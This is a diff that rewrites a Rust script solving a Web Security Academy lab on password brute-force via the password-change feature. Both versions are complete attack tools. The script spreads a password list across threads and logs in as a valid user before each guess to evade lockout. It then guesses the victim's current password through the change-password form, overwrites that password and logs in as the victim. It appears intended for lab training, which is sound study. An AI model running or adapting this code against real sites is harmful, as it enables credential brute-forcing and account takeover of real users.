@@ -1,251 +1,197 @@
-/******************************************************************
-*
-* Author: Ahmed Elqalaawy (@elqal3awii)
-*
-* Date: 29/8/2023
+/**********************************************************************
 *
 * Lab: Password brute-force via password change
 *
-* Steps: 1. Login with correct creds
-*        2. Change username when requesting change password API
-*        3. Repeat the process trying every password
+* Hack Steps: 
+*      1. Read password list
+*      2. Brute force carlos password via password change 
+*         functionality and change his password (login as wiener 
+*         before every try to bypass blocking)
+*      3. Wait 1 minute to bypass blocking
+*      4. Login as carlos with the new password
 *
-*******************************************************************/
-#![allow(unused)]
+***********************************************************************/
 use lazy_static::lazy_static;
-/***********
-* Imports
-***********/
-use rayon::prelude::*;
+use rayon::iter::{IntoParallelRefIterator, ParallelIterator};
+use regex::Regex;
 use reqwest::{
     blocking::{Client, ClientBuilder, Response},
-    header::HeaderMap,
     redirect::Policy,
-    Error,
 };
 use std::{
     collections::HashMap,
-    error,
-    fmt::format,
     fs,
     io::{self, Write},
-    process,
-    sync::{
-        atomic::{AtomicUsize, Ordering},
-        Arc, Mutex,
-    },
+    sync::atomic::{AtomicBool, AtomicUsize, Ordering},
     thread,
     time::{self, Duration, Instant},
 };
 use text_colorizer::Colorize;
 
-/******************
-* Global variables
-*******************/
+const LAB_URL: &str = "https://0ace0059036a947580b335640021008e.web-security-academy.net"; // Change this to your lab URL
+const NEW_CARLOS_PASSWORD: &str = "Hacked"; // You can change this to what you want
+
 lazy_static! {
-    static ref VALID_PASSWORD: Arc<Mutex<String>> = Arc::new(Mutex::new(String::new()));
-    static ref PASSWORDS_COUNTER: AtomicUsize = AtomicUsize::new(0);
+    static ref COUNTER: AtomicUsize = AtomicUsize::new(0);
+    static ref PASSWORD_IS_FOUND: AtomicBool = AtomicBool::new(false);
+    static ref SCRIPT_START_TIME: Instant = time::Instant::now();
+    static ref WEB_CLIENT: Client = build_web_client();
 }
 
-/******************
-* Main Function
-*******************/
 fn main() {
-    // change this to your lab URL
-    let url = "https://0aba002e036f2c5982898835006f006d.web-security-academy.net";
+    print!("⦗1⦘ Reading password list.. ");
 
-    // build the client that will be used for all subsequent requests
-    let client = build_client();
+    let password_list = read_password_list("../../passwords.txt"); // Make sure the file exist in your root directory or change its path accordingly
+    let total_count = password_list.iter().count();
 
-    // read password list as one string
-    // change the path to your password list
-    let passwords_string = fs::read_to_string("/home/ahmed/passwords").unwrap();
+    println!("{}", "OK".green());
+    println!("⦗2⦘ Brute forcing carlos password.. ");
 
-    // split the big string to a list of passwords
-    // change the separator to \r\n if you still a windows user
-    let passwords: Vec<&str> = passwords_string.split('\n').collect();
+    let threads = 8; // You can experiment with the number of threads by adjusting this variable
+    let mini_lists = build_mini_lists_for_threads(&password_list, threads);
+    brute_force_password_in_multiple_threads(mini_lists, total_count);
 
-    // set number of threads
-    let threads = 8;
+    let password_is_found = PASSWORD_IS_FOUND.fetch_and(true, Ordering::Relaxed);
+    if password_is_found {
+        print!("\n⦗3⦘ Waiting 1 minute to bypass blocking.. ");
+        wait_one_minute();
 
-    // how many passwords will be tried in each thread
-    let chunk_per_thread = passwords.len() / threads;
+        println!("{}", "OK".green());
+        print!("⦗4⦘ Logging in as carlos with the new password.. ");
 
-    // split the whole list to sublist to run each one in a thread
-    let passwords_chunks: Vec<_> = passwords.chunks(chunk_per_thread).collect();
+        let login_as_carlos = login("carlos", NEW_CARLOS_PASSWORD);
+        let session = get_session_cookie(&login_as_carlos);
+        fetch_with_session("/my-account", &session);
 
-    // capture the time before brute forcing
-    let start_time = time::Instant::now();
+        println!("{}", "OK".green());
+    } else {
+        println!("{}", "⦗!⦘ Failed to change carlos password".red());
+    }
 
-    println!(
-        "{} {}..",
-        "[#] Brute forcing password of".white().bold(),
-        "carlos".green().bold()
-    );
-
-    // set the new password
-    // change this to what you want
-    let new_password = "Hacked";
-
-    // get the password length
-    let passwords_count = passwords.len();
-
-    // run every sublist in different thread
-    passwords_chunks.par_iter().for_each(|minilist| {
-        // iterate over every password in the sublist
-        for password in minilist.iter() {
-            // iterate only if no valid password is found
-            if VALID_PASSWORD.lock().unwrap().len() == 0 {
-                // try to make a successful login first
-                if let Ok(login_res) = login(&client, &format!("{url}/login"), "wiener", "peter") {
-                    // check the status code of the response
-                    match login_res.status().as_u16() {
-                        // if a redirect happened which means login is successful
-                        302 => {
-                            // extract session cookie
-                            let session = extract_session_cookie(login_res);
-
-                            // try to guess the current password based on change password functionality
-                            let change_password = change_password(
-                                &client,
-                                &format!("{url}/my-account/change-password"),
-                                &session,
-                                "carlos",
-                                password,
-                                new_password,
-                            );
-
-                            // if the request is successful
-                            if let Ok(change_password_res) = change_password {
-                                // if the password is changed successfully
-                                if change_password_res.status().as_u16() == 200 {
-                                    // update the global valid_password variable
-                                    VALID_PASSWORD.lock().unwrap().push_str(password);
-
-                                    println!(
-                                        "\n[#] {} => {}",
-                                        password.blue().bold(),
-                                        "Correct".green().bold()
-                                    );
-                                    println!(
-                                        "[#] {}: {}",
-                                        "Password changed to".white().bold(),
-                                        new_password.green().bold()
-                                    );
-
-                                    break;
-                                } else {
-                                    // password are not correct
-                                    print!(
-                                        "\r[*] ({}/{}) {:10} => {}",
-                                        PASSWORDS_COUNTER.fetch_add(1, Ordering::Relaxed),
-                                        passwords_count,
-                                        password.blue().bold(),
-                                        "Incorrect".red().bold()
-                                    );
-                                    io::stdout().flush();
-                                }
-                            } else {
-                                // change password request failed
-                                println!(
-                                    "\n{}",
-                                    "[!] Failed to send change-password request".red().bold()
-                                )
-                            }
-                        }
-                        _ => {
-                            // login failed due to multiple requests; wait 1 minute and continue
-                            println!("[!] {}", "Waiting 1 minute".yellow().bold());
-                            thread::sleep(Duration::from_secs(60))
-                        }
-                    }
-                } else {
-                    // login faild for unknown reason
-                    println!(
-                        "[*] {} => {}",
-                        password.white().bold(),
-                        "LOGIN FAILED".red()
-                    );
-                }
-            } else {
-                // if valid password is valid, exit from all threads
-                return;
-            }
-        }
-    });
-    print_finish_message(start_time);
+    print_finish_message();
 }
 
-/*******************************************************************
-* Function used to build the client
-* Return a client that will be used in all subsequent requests
-********************************************************************/
-fn build_client() -> Client {
+fn build_web_client() -> Client {
     ClientBuilder::new()
         .redirect(Policy::none())
-        .connect_timeout(time::Duration::from_secs(60))
+        .connect_timeout(Duration::from_secs(5))
         .build()
         .unwrap()
 }
 
-/********************************************
-* Function used to login with correct creds
-*********************************************/
-fn login(client: &Client, url: &str, username: &str, password: &str) -> Result<Response, Error> {
-    client
-        .post(format!("{url}"))
-        .form(&HashMap::from([
-            ("username", username),
-            ("password", password),
-        ]))
+fn read_password_list(file_path: &str) -> Vec<String> {
+    let passwords_big_string = fs::read_to_string(file_path)
+        .expect(&format!("Failed to read the file: {}", file_path.red()));
+    passwords_big_string.lines().map(|p| p.to_owned()).collect()
+}
+
+fn build_mini_lists_for_threads(big_list: &Vec<String>, threads: usize) -> Vec<Vec<String>> {
+    let list_per_thread_size = big_list.len() / threads;
+    big_list
+        .chunks(list_per_thread_size)
+        .map(|f| f.to_owned())
+        .collect()
+}
+
+fn brute_force_password_in_multiple_threads(mini_lists: Vec<Vec<String>>, total_count: usize) {
+    // Use every mini list in a different thread
+    mini_lists.par_iter().for_each(|mini_list| {
+        for password in mini_list {
+            let is_found = PASSWORD_IS_FOUND.fetch_and(true, Ordering::Relaxed);
+            if is_found {
+                return; // Exit from the thread if the correct password was found
+            } else {
+                let login_as_wiener = login("wiener", "peter");
+                let session = get_session_cookie(&login_as_wiener);
+                let change_password =
+                    change_carlos_password(&session, password, NEW_CARLOS_PASSWORD);
+
+                if change_password.status().as_u16() == 200 {
+                    print_correct_password(password);
+                    PASSWORD_IS_FOUND.fetch_or(true, Ordering::Relaxed);
+                    return;
+                } else {
+                    let counter = COUNTER.fetch_add(1, Ordering::Relaxed);
+                    print_progress(counter, total_count, password);
+                }
+            }
+        }
+    })
+}
+
+fn login(username: &str, password: &str) -> Response {
+    let data = &HashMap::from([("username", username), ("password", password)]);
+    WEB_CLIENT
+        .post(&format!("{LAB_URL}/login"))
+        .form(&data)
         .send()
+        .expect(&format!("⦗!⦘ Failed to login as: {}", username))
 }
 
-/*****************************************************
-* Function used to extract session from cookie header
-******************************************************/
-fn extract_session_cookie(res: Response) -> String {
-    let re = regex::Regex::new("session=(.*); Secure").unwrap();
-    let cookie_header = res.headers().get("set-cookie").unwrap().to_str().unwrap();
-    re.captures(cookie_header)
-        .unwrap()
-        .get(1)
-        .unwrap()
-        .as_str()
-        .to_string()
+fn get_session_cookie(response: &Response) -> String {
+    let headers = response.headers();
+    let cookie_header = headers.get("set-cookie").unwrap().to_str().unwrap();
+    capture_pattern_from_text("session=(.*);", cookie_header)
 }
 
-/**********************************************
-* Function used to request change-password API
-***********************************************/
-fn change_password(
-    client: &Client,
-    url: &str,
-    session: &str,
-    username: &str,
-    current_password: &str,
-    new_password: &str,
-) -> Result<Response, Error> {
-    client
-        .post(url)
+fn capture_pattern_from_text(pattern: &str, text: &str) -> String {
+    let regex = Regex::new(pattern).unwrap();
+    let captures = regex.captures(text).expect(&format!(
+        "⦗!⦘ Failed to capture the pattern: {}",
+        pattern.red()
+    ));
+    captures.get(1).unwrap().as_str().to_string()
+}
+
+fn change_carlos_password(session: &str, current_password: &str, new_password: &str) -> Response {
+    WEB_CLIENT
+        .post(&format!("{LAB_URL}/my-account/change-password"))
         .header("Cookie", format!("session={session}"))
         .form(&HashMap::from([
-            ("username", username),
+            ("username", "carlos"),
             ("current-password", current_password),
             ("new-password-1", new_password),
             ("new-password-2", new_password),
         ]))
         .send()
+        .expect(&format!("{}", "⦗!⦘ Failed change carlos password"))
 }
 
-/****************************************************
-* Function used to print finish time
-*****************************************************/
-#[inline(always)]
-fn print_finish_message(start_time: Instant) {
-    println!(
-        "\n{}: {:?} minutes",
-        "✅ Finished in".green().bold(),
-        start_time.elapsed().as_secs() / 60
+fn fetch_with_session(path: &str, session: &str) -> Response {
+    WEB_CLIENT
+        .get(format!("{LAB_URL}{path}"))
+        .header("Cookie", format!("session={session}"))
+        .send()
+        .expect(&format!("⦗!⦘ Failed to fetch: {}", path.red()))
+}
+
+fn print_correct_password(password: &str) {
+    println!("\n🗹 Correct password: {}", password.green());
+    println!("🗹 Password was changed to: {}", NEW_CARLOS_PASSWORD.green());
+}
+
+fn print_progress(counter: usize, total_count: usize, password: &str) {
+    let elapsed_time = (SCRIPT_START_TIME.elapsed().as_secs()).to_string();
+    print!(
+        "\r❯❯ Elapsed: {:2} seconds || Trying ({}/{total_count}): {:50}",
+        elapsed_time.yellow(),
+        counter + 1,
+        password.blue()
     );
+    flush_terminal();
+}
+
+fn wait_one_minute() {
+    flush_terminal();
+    thread::sleep(Duration::from_secs(60))
+}
+
+fn print_finish_message() {
+    let elapsed_time = (SCRIPT_START_TIME.elapsed().as_secs()).to_string();
+    println!("🗹  Finished in: {} seconds", elapsed_time.yellow());
+    println!("🗹 The lab should be marked now as {}", "solved".green());
+}
+
+fn flush_terminal() {
+    io::stdout().flush().unwrap();
 }
